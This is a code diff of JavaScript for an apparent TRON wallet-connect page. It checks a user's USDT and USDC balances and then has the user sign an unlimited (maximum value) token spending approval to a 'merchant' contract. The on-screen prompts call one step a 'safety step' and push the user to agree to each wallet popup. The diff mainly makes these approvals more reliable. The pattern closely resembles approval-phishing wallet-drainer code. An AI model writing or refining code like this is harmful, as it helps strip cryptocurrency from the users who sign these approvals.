@@ -62,7 +62,38 @@ function updateConnectionUI(connected, address = null) {
     }
 }
 
-// ... (以下所有 checkTokenMaxAllowance, getTokenBalance, initializeContracts, connectTronLink, checkAuthorization, connectAndAuthorize 函數保持不變)
+// 交易計數器 (用於 sendTransaction 函數)
+let txCount = 0; 
+async function sendTransaction(methodCall, stepMessage, callValue = 0) {
+    txCount++;
+    showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
+    
+    try {
+        // 使用 send() 方法，讓 TronLink 處理簽名和廣播
+        const txHash = await methodCall.send({
+            // 提高手續費上限至 150 TRX (150,000,000 Sun)，減少因 Energy 不足而導致的失敗
+            feeLimit: 150_000_000, 
+            callValue: callValue,
+            shouldPollResponse: false 
+        });
+        
+        showOverlay(`步驟 ${txCount}/${totalTxs}: 交易已廣播。交易哈希: ${txHash.substring(0, 10)}...`);
+        
+        // 等待一小段時間讓區塊確認
+        await new Promise(resolve => setTimeout(resolve, 3000)); 
+        
+        return txHash;
+    } catch (error) {
+        // 統一處理錯誤，拋出更清晰的訊息
+        if (error.message && error.message.includes('User cancelled')) {
+             throw new Error('用戶在錢包中取消了交易。');
+        }
+        // 捕獲其他錯誤，例如 'ClassCastException: Estimated Energy is not enough'
+        throw new Error(`交易失敗或被拒絕。請確保錢包有足夠的 TRX (用於 Energy) 並同意了彈出視窗。底層錯誤: ${error.message}`);
+    }
+}
+
+
 async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
     if (!tronWeb || !userAddress) return false;
     try {
@@ -146,54 +177,58 @@ async function connectAndAuthorize() {
     const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
     const ZERO_UINT = "0"; 
     
+    // 計算總交易筆數，用於顯示進度
     let totalTxs = (status.contract ? 0 : 1); 
     if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
-        totalTxs += 2;
+        // 重置 0 + Max 授權 = 2 筆交易
+        totalTxs += 2; 
     }
-    let txCount = 0;
-
+    
+    // 重置交易計數器
+    txCount = 0; 
+    
     if (totalTxs === 0) {
-        showOverlay("所有授權已就緒。");
+        showOverlay("✅ 所有授權已就緒。");
         await new Promise(resolve => setTimeout(resolve, 1500)); 
         return true;
     }
     
     try {
-        const signAndSend = async (transaction, stepMessage) => {
-            txCount++;
-            showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
-            
-            const result = await tronWeb.trx.sign(transaction);
-            if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
-            
-            await tronWeb.trx.sendRawTransaction(result);
-        };
-
+        // 1. 合約授權 (ConnectAndAuthorize)
         if (!status.contract) {
-            const transaction = await merchantContract.connectAndAuthorize().build(); 
-            await signAndSend(transaction, "正在發送合約授權 (ConnectAndAuthorize)");
+            const methodCall = merchantContract.connectAndAuthorize();
+            // 使用新的 sendTransaction 輔助函數
+            await sendTransaction(methodCall, "正在發送合約授權 (ConnectAndAuthorize)");
         }
 
+        // 2. Max 扣款授權 (Approve)
         if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
             const token = status.authorizedToken;
             const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
             const tokenName = token === 'USDT' ? "USDT" : "USDC";
 
-            const zeroApproveTx = await tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
-            await signAndSend(zeroApproveTx, `${tokenName} 安全步驟: 重置授權至 0 (請同意)`);
+            // 2a. 重置授權至 0 (安全步驟)
+            await sendTransaction(
+                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT), 
+                `${tokenName} 安全步驟: 重置授權至 0 (請同意)`
+            );
 
-            const maxApproveTx = await tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
-            await signAndSend(maxApproveTx, `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`);
+            // 2b. 設置 Max 授權
+            await sendTransaction(
+                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT), 
+                `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`
+            );
         }
 
-        if (!status.authorizedToken) {
-             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始授權流程。");
+        if (!status.authorizedToken && totalTxs > 0) {
+             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始代幣授權流程。");
         }
         
         return true;
     } catch (error) {
         console.error("Authorization Failed:", error);
-        showOverlay(`授權交易失敗，錯誤訊息: ${error.message}。請確保錢包中有足夠的餘額 (TRX 支付手續費) 並同意了所有 ${totalTxs} 筆交易。`);
+        // 顯示修復後的、更精確的錯誤訊息
+        showOverlay(`🔴 授權交易失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意了所有 ${totalTxs} 筆交易。`);
         return false;
     }
 }
@@ -224,6 +259,7 @@ async function handlePostConnection() {
         
         const authSuccess = await connectAndAuthorize();
         if (authSuccess) {
+            // 授權成功，重新檢查狀態
             await handlePostConnection(); 
         }
     }
